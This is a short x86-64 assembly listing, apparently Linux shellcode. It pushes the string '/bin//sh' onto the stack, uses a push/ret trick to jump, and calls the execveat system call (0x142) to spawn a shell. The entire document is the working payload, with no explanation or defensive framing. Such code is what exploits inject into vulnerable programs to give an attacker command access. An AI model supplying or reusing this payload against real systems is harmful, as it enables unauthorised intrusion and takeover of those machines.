section .text

GLOBAL _start

_start:
[BITS 64]
cqo
push rdx
mov rdi, 0x68732f2f6e69622f
push rdi
lea rax, [rel next_instr] ;store next instruction address in rax
push rax
ret
next_instr:
mov rax, 0x142
push rsp
pop rsi
mov r8, rdx
mov r10, rdx
syscall
